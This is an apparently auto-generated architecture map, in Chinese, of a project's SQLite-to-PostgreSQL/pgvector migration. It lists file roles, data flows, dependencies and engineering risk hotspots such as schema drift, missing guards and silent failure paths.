  - {"file": "S:\\world-sim\\macro-ji\\tianji_db.py", "role": "macro-ji 独立容器的天际 SQLite 层：无 WORLDSIM_SQLITE_OFF 守卫，无 _NoopConn；直接 sqlite3.connect(DB_PATH)（line 120）；DATA_DIR 由 TIANJI_DATA_DIR 覆盖，默认指向 BASE_DIR/data。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\verify_reads_e0c.py", "role": "P2 双读校验台：同一查询在 SQLite(旧) 与 PG(新) 各跑一遍逐行比对；SQLITE_GONE 检测 P6 删库后切换为 PG 单侧健康模式；PG_ONLY 标志由 WORLDSIM_SQLITE_OFF 或 .sqlite_frozen_at marker 触发；add_gap() 登记已知 COUNT 缺口（synthesis_log/narrative_chunks）留 P3 处理。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\reconcile_synthesis.py", "role": "P3 synthesis_log 对账工具：只读 SQLite news.db → 与 PG news.synthesis_log 比较 id 集合 → INSERT 缺口行（含 pg_synced_at 列）；验证双向差集；依赖 SQLite 物理文件存在，P6 删库后不可用。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\reconcile_backfill.py", "role": "针对特定主键范围（硬编码 id=399/BETWEEN 1989-1995/32201-32293 等）的一次性行补填工具；ON CONFLICT DO NOTHING；b0_migrate 漏回填的 5 张表。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\silent_failure_probe.py", "role": "静默失败探针：三类检查 — dualwrite(PG vs SQLite 主键差集)、heartbeat(调度器心跳 mtime)、artifacts(grv/news_export/observability 产物新鲜度)；新增 check_backup/check_news_risk/check_fred_lag/check_sqlite_gone/check_feed_fresh；.sqlite_frozen_at marker 存在时切换 PG-only 验证模式；缺口写 data/dualwrite_gap.json；ntfy 推送告警。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\b0_migrate.py", "role": "B0 批量迁移：news.db + forecast_tracker.db → worldsim-pg 全量 backfill；DDL 建 news/forecast/tianji 三个 schema；norm_ts() 将 naive UTC ISO 追加 +00:00；--apply-schema/--backfill/--verify/--only 四档操作。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\d0_migrate_rag.py", "role": "D0 迁移：chroma → pgvector；建 rag schema + rag.embeddings 表（vector(1024)，HNSW cosine m=16 ef=64）；对应 04_d0_schema.sql。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\final_acceptance_e0c.py", "role": "E0-C 验收套件（只读，不写）：16 模块 import / scheduler JOBS 数 / 心跳 / 探针 / harness / pg_read 行边界归一化 / 关键读函数真实数据 / news_export.json / 缺口文件 / 当日产物；共 10 个检查点。"}
  - {"file": "S:\\world-sim\\sql\\01_indicators.sql", "role": "public.indicators 宽表 DDL（indicator_key/as_of/data_vintage/horizon 五元组 UNIQUE 身份键，TIMESTAMPTZ created_at）；由 pg_write_indicators.py 写入。"}
  - {"file": "S:\\world-sim\\macro-scan\\sql\\02_indicator_weights.sql", "role": "public.indicator_weights DDL（source_id × target_type PK，weight CHECK 约束）；由 c0_compute_weights.py 写入。"}
  - {"file": "S:\\world-sim\\macro-scan\\sql\\03_b0_schema.sql", "role": "B0 权威 DDL：news/forecast/tianji 三个 schema 全量建表语句；与 b0_migrate.py 内嵌 DDL 完全一致（注意：均无 pg_synced_at 列）。"}
  - {"file": "S:\\world-sim\\macro-scan\\sql\\04_d0_schema.sql", "role": "D0 权威 DDL：CREATE EXTENSION vector + rag schema + rag.embeddings（vector(1024) HNSW cosine）。"}
  - {"file": "S:\\world-sim\\infra\\pg\\deploy-pg.sh", "role": "worldsim-pg 容器部署固化脚本：pgvector/pgvector:pg16 镜像；port=5434:5432；挂载 /vol2/1000/software/worldsim-pg/pgdata；建 worldsim_app + worldsim_ro 角色；pg_hba ACL 172.29.0.0/16 scram-sha-256；连通 macro-scan + tianji 容器。"}

**数据流**

  写路径（双写阶段 WORLDSIM_SQLITE_OFF=0）：
  采集模块（scan_weak_signals / fetch_rss_news 等）
    → news_db.write_scan_context / insert_articles / insert_signal_episode
      → [主] sqlite3.connect(news.db, WAL)
      → [旁路] pg_write_collection.upsert_news_*()（C3 重试，异常自吞）
    → forecast_tracker.ForecastTracker.log_forecast
      → [主] sqlite3.connect(forecast_tracker.db)
      → [旁路] pg_write_collection.upsert_forecast()
    → tianji_db.save_prediction
      → [主] sqlite3.connect(forecast_tracker.db)（同一文件）
      → [旁路] pg_write_collection.upsert_tianji_prediction()
    → signal_synthesizer._fire_rule
      → SQLite INSERT synthesis_log（非 P3 之前不在双写范围）
      → pg_write_collection.upsert_synthesis_log()（P3 后加入）

写路径（PG-only WORLDSIM_SQLITE_OFF=1）：
  news_db：_PG_ONLY=True → _conn() raise RuntimeError；写操作直调 _pwc._next_id()+upsert_*
  forecast_tracker/tianji_db（核心代码版）：_PG_ONLY=True → _connect() 返回 _NoopConn 桩；SQLite 写静默丢弃，PG 双写继续
  signal_synthesizer：函数内逐一检查 WORLDSIM_SQLITE_OFF（非模块级标志，见风险热点）

读路径（E0-C，所有消费模块已切 PG）：
  pg_read.connect()
    → psycopg.connect(host=worldsim-pg, user=worldsim_app, WORLDSIM_APP_PW)
    → options="-c search_path=news,forecast,tianji,public"
    → row_factory=_row_factory → _Row（datetime→UTC文本 / Decimal→float / bool→int / bytes→str）
  消费模块：situation_detector / situation_tracker / geo_risk_vector / grv_threshold /
            daily_narrative / news_exporter / signal_synthesizer / observability /
            narrative_processor / forecast_tracker._pg_fetch / tianji_db（读侧）
            → 均通过 pg_read.connect() 或 pg_read.exec_read()

对账/迁移路径：
  verify_reads_e0c.py：SQLite sq() vs PG pg() 双读逐行 compare()
  reconcile_synthesis.py：SQLite → PG synthesis_log 缺口补填
  reconcile_backfill.py：hardcoded id 范围补填 5 张表
  silent_failure_probe.check_dualwrite()：PG vs SQLite 主键差集监控

PG schema 与写模块映射：
  public.indicators              ← pg_write_indicators.py
  public.indicator_weights       ← c0_compute_weights.py
  news.* (scan_contexts/articles/article_categories/signal_episodes/episode_articles) ← pg_write_collection.py（E0-A 双写）
  news.synthesis_log             ← pg_write_collection.upsert_synthesis_log（P3 后）+ reconcile_synthesis.py（补填）
  forecast.*                     ← pg_write_collection.py（E0-A 双写）
  tianji.*                       ← pg_write_collection.py（E0-A 双写）
  rag.embeddings                 ← d0_migrate_rag.py（D0 一次性迁移）+ rag_engine.py（运行时）

**外部依赖**

  - worldsim-pg 容器：PostgreSQL 16 + pgvector 0.8.2，host=worldsim-pg port=5432（容器内）/ 127.0.0.1:5434（宿主机），镜像 pgvector/pgvector:pg16，数据卷 /vol2/1000/software/worldsim-pg/pgdata
  - WORLDSIM_APP_PW 环境变量：psycopg 3.x 认证（worldsim_app 角色），pg_read 和 pg_write_collection 均依赖
  - WORLDSIM_SQLITE_OFF=1 环境变量：触发 PG-only 模式，模块加载时固化为 _PG_ONLY 标志
  - Docker 网络 worldsim_default（172.29.0.0/16）：macro-scan + macro-ji + tianji 容器与 worldsim-pg 的 L2 连通
  - /workspace/data/ 挂载卷：SQLite 文件（P6 前）、artifact JSON（news_export.json/grv_latest.json/news_risk.json）、fred_history/ CSV、dualwrite_gap.json、.sqlite_frozen_at marker、.last_pg_backup marker、.scheduler_heartbeat
  - /workspace/data/.sqlite_frozen_at：verify_reads_e0c.py PG_ONLY 标志触发文件，silent_failure_probe 读取 mtime 判断 SQLite 冻结确认
  - psycopg 3.x（macro-scan 镜像 v8 预装）
  - WORLDSIM_RO_PW 环境变量：worldsim_ro 角色（只读外部查询用，pg_read 未使用）
  - FRED_API_KEY 环境变量：fred_history CSV 刷新（silent_failure_probe 监控滞后）

**风险热点**

  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\reconcile_synthesis.py", "area": "pg_synced_at 列 schema 漂移", "why": "reconcile_synthesis.py:77 和 pg_write_collection.py:143 的 INSERT 均包含 pg_synced_at 列，但 03_b0_schema.sql 和 b0_migrate.py 内嵌 DDL 的 news.synthesis_log 建表语句中均无此列。该列只能以 ALTER TABLE 方式在生产环境手动加入，schema 文件与实际表结构漂移：任何在新环境执行 DDL 后直接运行 reconcile 或 upsert_synthesis_log 的操作将以 column not found 失败。"}
  - {"file": "S:\\world-sim\\macro-ji\\tianji_db.py", "area": "macro-ji 容器缺少 WORLDSIM_SQLITE_OFF 守卫", "why": "macro-ji/tianji_db.py line 120 直接 sqlite3.connect(DB_PATH)，无 _PG_ONLY 判断，无 _NoopConn 桩，与 macro-scan/核心代码/tianji_db.py 的 P6 守卫不同步。P6 SQLite 删库后若 macro-ji 容器启动，sqlite3.connect 将静默创建空的 forecast_tracker.db（即 news_db.py 注释记录的 P0 复生问题在该容器的对等复现）。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\pg_read.py", "area": "exec_read() 静默返回空列表掩盖 PG 故障", "why": "pg_read.exec_read()（line 141）和 connect()（line 127）在 PG 不可用时均返回 []/None 而不抛异常。news_db.get_trigger_titles、forecast_tracker._pg_fetch、observability.read_synthesizer_stats 等调用方将 PG 宕机解读为数据为空，造成零报告而非告警，不触发 silent_failure_probe 的 CRIT 路径。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\verify_reads_e0c.py", "area": "cutoff30local 用本地时间对比 PG timestamptz", "why": "line 175：cutoff30local = (dt.datetime.now() - timedelta(days=30)).isoformat()[:19] 使用容器本地时间（非 UTC）。grv_conflict_floor 检查将此值与 PG news.articles.published_at（timestamptz UTC 存储）比较，容器时区偏移 UTC 时产生系统性误差，导致双读 COUNT 不一致被错误标记为 DIFF 或掩盖真实差异。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\b0_migrate.py", "area": "backfill 时以读写模式打开 SQLite（无 mode=ro）", "why": "line 57：sqlite3.connect(os.path.join(DATA_DIR, dbfile)) 无 mode=ro URI。P6 删库后若意外重跑 --backfill，sqlite3.connect 将在 DATA_DIR 下静默创建空的 news.db 和 forecast_tracker.db，与 news_db._conn() 的 P6 守卫逻辑矛盾，且新建空库不触发 silent_failure_probe 的 sqlite_gone CRIT（文件确实出现了）。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\news_db.py", "area": "WORLDSIM_SQLITE_OFF 在模块加载时固化，热重载失效", "why": "line 133：_PG_ONLY 在模块导入时求值。scheduler 子进程继承父进程 import 缓存；若 env var 在运行时动态修改（docker exec 注入/滚动部署），已运行的子进程仍持有旧的 _PG_ONLY=False，继续写 SQLite。forecast_tracker.py line 104 和 tianji_db.py（核心代码版）line 123 存在相同问题。"}
  - {"file": "S:\\world-sim\\macro-scan\\核心代码\\signal_synthesizer.py", "area": "WORLDSIM_SQLITE_OFF 检查散落在函数内而非模块级标志", "why": "_check_data_maturity(line 79)、_fire_rule(line 283)、_update_synthesis_success(line 555) 各自调用 os.environ.get，而 _check_resonance 和 _check_silence 直接调用 _conn() 无 env 守卫（line 112 起）。P6 删库后 _check_resonance 将在文件不存在时抛 RuntimeError 中断整个合成器流程。"}

**备注**

  迁移阶段编号：B0=批量初始迁移；C0=权重派生；D0=chroma→pgvector；E0-A=旁路双写；E0-C=读路径切 PG；P2=消费模块翻 reader；P3=synthesis_log 对账；P6=SQLite 删库。

synthesis_log 是唯一一张在 E0-A 原始双写范围外、事后通过 P3 单独补写的表，原因见 pg_write_collection.py:11 注释（留 C 阶段）。该表的 pg_synced_at 列是生产环境 ALTER TABLE 添加的，未回写到任何 DDL 文件（03_b0_schema.sql / b0_migrate.py），构成最高优先级 schema 漂移风险。

macro-ji/tianji_db.py 与 macro-scan/核心代码/tianji_db.py 是两份独立副本，后者已补 P6 守卫，前者未同步，是第二优先级风险。

verify_reads_e0c.py 的 PG_ONLY 标志由两个独立条件触发（WORLDSIM_SQLITE_OFF env var OR .sqlite_frozen_at 文件），运维须保持一致；.sqlite_frozen_at 由 silent_failure_probe.check_dualwrite() 读取用于区分双写模式和 PG-only 模式的探针行为。
